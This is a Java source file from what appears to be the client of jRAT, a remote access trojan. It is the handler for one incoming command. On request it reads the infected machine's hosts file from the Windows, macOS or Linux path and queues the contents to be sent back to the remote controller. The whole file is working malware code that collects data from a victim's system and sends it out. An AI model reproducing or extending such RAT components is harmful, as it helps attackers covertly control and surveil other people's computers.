package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet38HostFile;
import oslib.OperatingSystem;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;


public class Packet55HostsFile extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		File file = null;

		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
			file = new File("/private/etc/hosts");
		} else {
			file = new File("/etc/hosts");
		}

		if (file != null) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
			String tosend = "";

			String line;

			while ((line = reader.readLine()) != null) {
				tosend += line + "\n";
			}
			reader.close();

			con.addToSendQueue(new Packet38HostFile(tosend));
		}
	}

}
